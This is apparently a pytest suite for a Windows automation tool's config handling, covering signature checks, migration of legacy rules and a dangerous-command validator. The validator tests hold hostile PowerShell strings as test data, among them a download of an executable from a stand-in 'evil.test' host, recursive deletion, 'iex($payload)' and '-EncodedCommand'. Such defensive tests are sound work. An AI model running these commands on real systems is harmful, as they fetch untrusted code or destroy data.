"""配置文件签名、规范化迁移与安全校验"""

import json
import os

import pytest

import notmyfault.config as config_mod
from notmyfault.config import ConfigValidationError
from notmyfault.security.plugin_schema import validate_plugin_meta


ACTIONS_DIR = os.path.join(os.path.dirname(config_mod.__file__), "actions")


@pytest.fixture
def isolated_config(tmp_path, monkeypatch):
    config_file = str(tmp_path / "config.json")
    monkeypatch.setattr(config_mod, "CONFIG_FILE", config_file)
    return config_file


def write_signed(config: dict) -> None:
    """安装密钥并写入一份带有效签名的配置"""
    config_mod._get_or_create_secret()
    data = dict(config)
    data[config_mod._SIGNATURE_KEY] = config_mod._sign_config(data)
    with open(config_mod.CONFIG_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False)


class TestActionManifests:
    def test_all_action_manifests_are_valid(self):
        checked = 0
        for name in sorted(os.listdir(ACTIONS_DIR)):
            manifest = os.path.join(ACTIONS_DIR, name, "action.json")
            if not os.path.isfile(manifest):
                continue
            with open(manifest, "r", encoding="utf-8") as f:
                meta = json.load(f)
            ok, errors = validate_plugin_meta(meta, "action")
            assert ok, f"{name}: {errors}"
            checked += 1
        assert checked > 0


class TestAllowedActionTypes:
    def test_all_actions_in_whitelist(self):
        builtin = {
            name for name in os.listdir(ACTIONS_DIR)
            if os.path.isdir(os.path.join(ACTIONS_DIR, name))
        }
        used = {
            action["type"]
            for rule in config_mod.DEFAULT_CONFIG["rules"]
            for action in rule["actions"]
        }
        assert used
        assert used <= builtin


class TestDangerousCommand:
    def test_benign_commands_pass(self):
        for cmd in (
            "Get-Process | Sort-Object CPU -Descending",
            "Write-Output 'hello world'",
            "Get-ChildItem C:\\Logs -Filter *.log",
        ):
            assert config_mod._has_dangerous_command(cmd) is None

    def test_plain_dangerous_commands_hit(self):
        assert config_mod._has_dangerous_command(
            "Invoke-WebRequest http://evil.test/x.exe -OutFile x.exe"
        ) == "Invoke-WebRequest"
        assert config_mod._has_dangerous_command(
            "Remove-Item C:\\Data -Recurse"
        ) == "Remove-Item"

    def test_nested_powershell_blocked(self):
        result = config_mod._has_dangerous_command(
            'cmd /c "powershell.exe -NoProfile -Command Get-Service"'
        )
        assert result == "嵌套 PowerShell"

    def test_iex_without_space_blocked(self):
        # IEX 子串黑名单先于正则命中，无论哪条路径都算拦截
        result = config_mod._has_dangerous_command("iex($payload)")
        assert result is not None
        assert config_mod._has_dangerous_command("& $scriptBlock") is not None

    def test_get_command_dynamic_blocked(self):
        result = config_mod._has_dangerous_command("get-command Test-NetConnection")
        assert result == "get-command"

    def test_shell_piecewise_construction_blocked(self):
        result = config_mod._has_dangerous_command("$a = $env:TEMP + '\\p.exe'")
        assert result == "环境变量拼接"

    def test_rule_safety_rejects_bypass(self):
        rules = [
            {
                "name": "危险规则",
                "actions": [
                    {
                        "type": "run_powershell",
                        "params": {"command": "powershell -EncodedCommand QUFB"},
                    }
                ],
            },
            {
                "name": "危险启动",
                "actions": [
                    {
                        "type": "launch_program",
                        "params": {"path": "C:\\Windows\\System32\\cmd.exe"},
                    }
                ],
            },
        ]
        _warnings, errors = config_mod._validate_rules_safety(rules)
        assert len(errors) == 2
        assert "危险规则" in errors[0]
        assert "-EncodedCommand" in errors[0]
        assert "危险启动" in errors[1]

        safe_rules = [
            {
                "name": "安全",
                "actions": [
                    {"type": "run_powershell", "params": {"command": "Get-Service"}},
                    {"type": "launch_program", "params": {"path": "C:\\App\\app.exe"}},
                ],
            }
        ]
        _warnings, errors = config_mod._validate_rules_safety(safe_rules)
        assert errors == []


class TestGetConfig:
    def test_config_file_not_exists_creates_default(self, isolated_config):
        config = config_mod.get_config()
        assert os.path.exists(isolated_config)
        assert len(config["rules"]) == 6

    def test_config_creates_missing_dir(self, tmp_path, monkeypatch):
        nested = str(tmp_path / "deep" / "nested" / "config.json")
        monkeypatch.setattr(config_mod, "CONFIG_FILE", nested)
        config = config_mod.get_config()
        assert os.path.isdir(os.path.dirname(nested))
        assert len(config["rules"]) == 6

    def test_config_file_exists_valid(self, isolated_config, capsys):
        config_mod.save_config(config_mod._default_v2_config())
        capsys.readouterr()
        config = config_mod.get_config()
        assert len(config["rules"]) == 6
        assert "Config loaded" in capsys.readouterr().out

    def test_config_returns_deepcopy(self, isolated_config):
        config = config_mod.get_config()
        assert config is not config_mod.DEFAULT_CONFIG
        config["rules"].pop()
        fresh = config_mod.get_config()
        assert len(fresh["rules"]) == 6

    def test_default_config_has_six_rules(self, isolated_config):
        config = config_mod.get_config()
        assert len(config["rules"]) == 6

    def test_default_config_rules_have_expected_structure(self, isolated_config):
        config = config_mod.get_config()
        for rule in config["rules"]:
            assert isinstance(rule["name"], str)
            assert rule["event"]["type"] == "process_state"
            assert "process_name" in rule["event"]["params"]
            assert rule["event"]["params"]["state"] in ("running", "stopped")
            types = [action["type"] for action in rule["actions"]]
            assert "set_volume" in types
            assert "notify" in types

    def test_config_processes_legacy_becomes_rules(self, isolated_config, capsys):
        write_signed({
            "processes": [
                {
                    "process_name": "test.exe",
                    "software_name": "测试软件",
                    "volume_action": "half",
                    "notification": {"title": "提示", "message": "内容"},
                }
            ]
        })
        config = config_mod.get_config()
        assert len(config["rules"]) == 1
        rule = config["rules"][0]
        assert rule["name"] == "测试软件 音量规则"
        assert rule["event"]["params"]["process_name"] == "test.exe"
        assert rule["actions"][0]["params"]["action"] == "half"
        assert "Legacy config migrated" in capsys.readouterr().out

    def test_config_with_only_processes_becomes_empty_rules(self, isolated_config):
        write_signed({"processes": []})
        config = config_mod.get_config()
        assert config.get("rules", []) == []

    def test_legacy_trigger_config_becomes_normalized(self, isolated_config):
        write_signed({
            "rules": [
                {
                    "name": "旧格式",
                    "trigger": {
                        "type": "process_state",
                        "params": {"process_name": "a.exe", "state": "running"},
                    },
                    "actions": [{"type": "notify", "params": {"title": "t", "message": "m"}}],
                }
            ]
        })
        config = config_mod.get_config()
        rule = config["rules"][0]
        assert "trigger" not in rule
        assert rule["event"]["type"] == "process_state"
        assert rule["event"]["binding_id"].startswith("t_")
        assert config["schema_version"] == 2

    def test_missing_secret_pauses_engine(self, isolated_config):
        write_signed(config_mod._default_v2_config())
        os.remove(config_mod._secret_path())
        with pytest.raises(ConfigValidationError) as excinfo:
            config_mod.get_config()
        assert "引擎已暂停" in str(excinfo.value)

    def test_missing_secret_rejects_signed_config(self, isolated_config):
        write_signed(config_mod._default_v2_config())
        os.remove(config_mod._secret_path())
        with pytest.raises(ConfigValidationError) as excinfo:
            config_mod.load_verified_config()
        assert "配置签名密钥缺失" in str(excinfo.value)

    def test_config_corrupt_json_falls_back_to_default(self, isolated_config, capsys):
        config_mod.save_config(config_mod._default_v2_config())
        with open(isolated_config, "w", encoding="utf-8") as f:
            f.write("{不是合法的 JSON")
        capsys.readouterr()
        config = config_mod.get_config()
        assert len(config["rules"]) == 6
        assert "配置文件损坏" in capsys.readouterr().err

    def test_backup_without_secret_is_rejected(self, isolated_config, capsys):
        config_mod.save_config(config_mod._default_v2_config())
        # 二次保存生成 .bak，再删除密钥并损坏主文件
        config_mod.save_config(config_mod._default_v2_config())
        os.remove(config_mod._secret_path())
        with open(isolated_config, "w", encoding="utf-8") as f:
            f.write("损坏内容")
        capsys.readouterr()
        config = config_mod.get_config()
        err = capsys.readouterr().err
        assert "签名密钥缺失，无法验证备份，拒绝恢复" in err
        assert len(config["rules"]) == 6


class TestNormalizeConfig:
    def test_empty_dict(self):
        assert config_mod._normalize_config({}) == {}

    def test_none_input(self):
        assert config_mod._normalize_config(None) is None

    def test_int_input(self):
        assert config_mod._normalize_config(5) == 5

    def test_string_input(self):
        assert config_mod._normalize_config("abc") == "abc"

    def test_list_input(self):
        assert config_mod._normalize_config([1, 2]) == [1, 2]

    def test_no_rules_no_processes(self):
        config = {"disabled_plugins": {"triggers": [], "actions": []}}
        assert config_mod._normalize_config(config) == config

    def test_already_normalized_rules(self):
        config = {
            "rules": [
                {
                    "name": "规则",
                    "event": {
                        "type": "process_state",
                        "params": {"process_name": "a.exe", "state": "running"},
                    },
                    "actions": [{"type": "notify", "params": {"title": "t", "message": "m"}}],
                }
            ]
        }
        result = config_mod._normalize_config(config)
        assert result["schema_version"] == 2
        rule = result["rules"][0]
        assert rule["event"]["binding_id"].startswith("t_")
        assert rule["actions"][0]["binding_id"].startswith("a_")

    def test_trigger_to_event_migration(self):
        config = {
            "rules": [
                {
                    "name": "旧规则",
                    "trigger": {"type": "hotkey", "params": {"key": "F9"}},
                    "actions": [],
                }
            ]
        }
        rule = config_mod._normalize_config(config)["rules"][0]
        assert "trigger" not in rule
        assert rule["event"]["type"] == "hotkey"

    def test_trigger_to_event_preserves_other_keys(self):
        config = {
            "rules": [
                {
                    "name": "保留名字",
                    "trigger": {"type": "hotkey", "params": {"key": "F9"}},
                    "actions": [{"type": "notify", "params": {}}],
                    "enabled": True,
                }
            ]
        }
        rule = config_mod._normalize_config(config)["rules"][0]
        assert rule["name"] == "保留名字"
        assert rule["enabled"] is True
        assert rule["event"]["type"] == "hotkey"

    def test_mixed_trigger_and_event_in_rules(self):
        config = {
            "rules": [
                {
                    "name": "两者都有",
                    "trigger": {"type": "hotkey", "params": {"key": "F9"}},
                    "event": {"type": "manual", "params": {}},
                    "actions": [],
                }
            ]
        }
        rule = config_mod._normalize_config(config)["rules"][0]
        assert "trigger" not in rule
        # event 已存在时 trigger 不会覆盖它
        assert rule["event"]["type"] == "manual"

    def test_non_dict_in_rules_list(self):
        config = {
            "rules": [
                42,
                "bad",
                {
                    "name": "有效",
                    "event": {"type": "manual", "params": {}},
                    "actions": [],
                },
            ]
        }
        result = config_mod._normalize_config(config)
        assert len(result["rules"]) == 1
        assert result["rules"][0]["name"] == "有效"

    def test_preserves_extra_top_level_keys_in_rules(self):
        config = {
            "disabled_plugins": {"triggers": ["x"], "actions": []},
            "custom_key": 123,
            "rules": [
                {"name": "r", "event": {"type": "manual", "params": {}}, "actions": []}
            ],
        }
        result = config_mod._normalize_config(config)
        assert result["disabled_plugins"] == {"triggers": ["x"], "actions": []}
        assert result["custom_key"] == 123
        assert result["schema_version"] == 2

    def test_processes_to_rules_basic(self):
        config = {
            "processes": [
                {
                    "process_name": "app.exe",
                    "software_name": "应用",
                    "volume_action": "min",
                    "notification": {"title": "标题", "message": "消息"},
                }
            ]
        }
        result = config_mod._normalize_config(config)
        assert result["schema_version"] == 2
        assert "processes" not in result
        rule = result["rules"][0]
        assert rule["name"] == "应用 音量规则"
        assert rule["event"] == {
            "type": "process_state",
            "params": {"process_name": "app.exe", "state": "running"},
            "binding_id": rule["event"]["binding_id"],
        }
        assert rule["actions"][0] == {
            "type": "set_volume",
            "params": {"action": "min"},
            "binding_id": rule["actions"][0]["binding_id"],
        }
        assert rule["actions"][1]["params"] == {"title": "标题", "message": "消息"}

    def test_processes_empty_list(self):
        config = {"processes": []}
        assert config_mod._normalize_config(config) == config

    def test_processes_not_a_list(self):
        config = {"processes": "not a list"}
        assert config_mod._normalize_config(config) == config

    def test_processes_none_notification(self):
        config = {
            "processes": [
                {"process_name": "a.exe", "software_name": "A", "notification": None}
            ]
        }
        rule = config_mod._normalize_config(config)["rules"][0]
        notify = rule["actions"][1]
        assert notify["params"]["title"] == "A 正在运行"
        assert notify["params"]["message"] == ""

    def test_processes_empty_notification_object(self):
        config = {"processes": [{"process_name": "a.exe", "software_name": "A", "notification": {}}]}
        rule = config_mod._normalize_config(config)["rules"][0]
        assert rule["actions"][1]["params"] == {"title": "A 正在运行", "message": ""}

    def test_processes_missing_optional_fields(self):
        config = {"processes": [{"process_name": "solo.exe"}]}
        rule = config_mod._normalize_config(config)["rules"][0]
        assert rule["name"] == "solo.exe 音量规则"
        assert rule["actions"][0]["params"]["action"] == "max"

    def test_non_dict_in_processes_list(self):
        config = {
            "processes": [
                "junk",
                {"process_name": "real.exe", "software_name": "真实"},
            ]
        }
        result = config_mod._normalize_config(config)
        assert len(result["rules"]) == 1
        assert result["rules"][0]["name"] == "真实 音量规则"

    def test_preserves_top_level_keys_in_processes_migration(self):
        config = {
            "disabled_plugins": {"triggers": [], "actions": ["y"]},
            "processes": [{"process_name": "a.exe", "software_name": "A"}],
        }
        result = config_mod._normalize_config(config)
        assert result["disabled_plugins"] == {"triggers": [], "actions": ["y"]}
        assert "processes" not in result

    def test_legacy_condition_groups_are_canonicalized_without_losing_leaves(self):
        leaves = [
            {"type": "process_state", "params": {"process_name": "a.exe", "state": "running"}},
            {"type": "hotkey", "params": {"key": "F9"}},
        ]
        config = {
            "rules": [
                {
                    "name": "条件组",
                    "condition": {"type": "and", "events": [dict(l) for l in leaves]},
                    "actions": [],
                }
            ]
        }
        rule = config_mod._normalize_config(config)["rules"][0]
        condition = rule["condition"]
        assert condition["op"] == "all"
        assert "events" not in condition
        assert len(condition["children"]) == 2
        assert [child["type"] for child in condition["children"]] == [
            "process_state", "hotkey"
        ]

    def test_any_condition_drops_stale_within_seconds_recursively(self):
        config = {
            "rules": [
                {
                    "name": "嵌套条件",
                    "condition": {
                        "op": "any",
                        "within_seconds": 30,
                        "children": [
                            {
                                "op": "any",
                                "within_seconds": 10,
                                "children": [
                                    {"type": "manual", "params": {}}
                                ],
                            },
                            {"type": "manual", "params": {}},
                        ],
                    },
                    "actions": [],
                }
            ]
        }
        rule = config_mod._normalize_config(config)["rules"][0]
        outer = rule["condition"]
        assert "within_seconds" not in outer
        inner = outer["children"][0]
        assert isinstance(inner["children"], list)
        assert "within_seconds" not in inner

    def test_duplicate_event_condition_is_collapsed(self):
        event = {
            "type": "process_state",
            "params": {"process_name": "a.exe", "state": "running"},
        }
        config = {
            "rules": [
                {
                    "name": "重复",
                    "event": dict(event),
                    "condition": {"op": "any", "children": [dict(event)]},
                    "actions": [],
                }
            ]
        }
        rule = config_mod._normalize_config(config)["rules"][0]
        assert "condition" not in rule
        assert rule["event"]["type"] == "process_state"

    def test_legacy_step_ids_are_removed_and_references_migrated(self):
        config = {
            "rules": [
                {
                    "name": "引用迁移",
                    "event": {"type": "manual", "params": {}},
                    "actions": [
                        {"type": "run_powershell", "id": "step_a", "params": {"command": "Get-Service"}},
                        {"type": "notify", "params": {"title": "{{ steps.step_a.result.stdout }}", "message": "m"}},
                    ],
                }
            ]
        }
        rule = config_mod._normalize_config(config)["rules"][0]
        first, second = rule["actions"]
        assert "id" not in first
        node = first["binding_id"]
        assert second["params"]["title"] == {
            "$ref": {"scope": "step", "node": node, "path": ["stdout"]}
        }

    def test_event_payload_template_migrates_to_ref(self):
        config = {
            "rules": [
                {
                    "name": "模板",
                    "event": {"type": "manual", "params": {}},
                    "actions": [
                        {"type": "notify", "params": {"title": "{{ event.payload.path }}", "message": "m"}}
                    ],
                }
            ]
        }
        rule = config_mod._normalize_config(config)["rules"][0]
        assert rule["actions"][0]["params"]["title"] == {
            "$ref": {"scope": "event", "path": ["path"]}
        }

    def test_mixed_template_stays_as_string(self):
        config = {
            "rules": [
                {
                    "name": "混合模板",
                    "event": {"type": "manual", "params": {}},
                    "actions": [
                        {"type": "notify", "params": {"title": "文件: {{ event.payload.path }}", "message": "m"}}
                    ],
                }
            ]
        }
        rule = config_mod._normalize_config(config)["rules"][0]
        assert rule["actions"][0]["params"]["title"] == "文件: {{ event.payload.path }}"


class TestVerifiedConfig:
    def test_rejects_tampered_config(self, isolated_config):
        config_mod.save_config(config_mod._default_v2_config())
        with open(isolated_config, "r", encoding="utf-8") as f:
            data = json.load(f)
        data["rules"][0]["name"] = "被篡改的规则"
        with open(isolated_config, "w", encoding="utf-8") as f:
            json.dump(data, f, ensure_ascii=False)
        with pytest.raises(ConfigValidationError) as excinfo:
            config_mod.load_verified_config()
        assert "签名校验失败" in str(excinfo.value)

    def test_save_config_removes_hidden_legacy_fields(self, isolated_config):
        assert config_mod.save_config({
            "processes": [
                {"process_name": "old.exe", "software_name": "旧软件"}
            ]
        })
        with open(isolated_config, "r", encoding="utf-8") as f:
            saved = json.load(f)
        assert "processes" not in saved
        assert len(saved["rules"]) == 1
        assert config_mod._SIGNATURE_KEY in saved
